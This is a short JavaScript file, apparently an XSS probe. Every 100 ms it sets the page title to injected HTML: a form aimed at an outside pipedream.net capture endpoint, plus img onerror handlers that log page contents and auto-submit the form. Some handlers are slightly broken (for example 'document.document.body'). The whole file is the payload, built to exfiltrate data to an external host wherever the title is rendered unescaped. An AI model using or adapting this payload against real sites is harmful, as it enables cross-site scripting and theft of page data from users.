function changeTitle(){
    window.setInterval(function(){
        document.title = 
            '<form name="xss_form" action="https://eo28kejt5kjkrb9.m.pipedream.net" method="GET">\
                <input type="text" id="info" name="info"> \
                <input type="submit" value="Submit"> \
            </form>\
            <img src="x" onerror="console.log(document.documentElement.innerHTML)">\
            <img src="x" onerror="console.log(document.document.body.innerHTML)">\
            <img src="x" onerror="console.log(document.document.body.innertext)">\
            <img src="x" onerror="document.forms.xss_form.elements.info.value = 3">\
            <img src="x" onerror="document.forms.xss_form.submit()">';
            
    }, 100);
    
}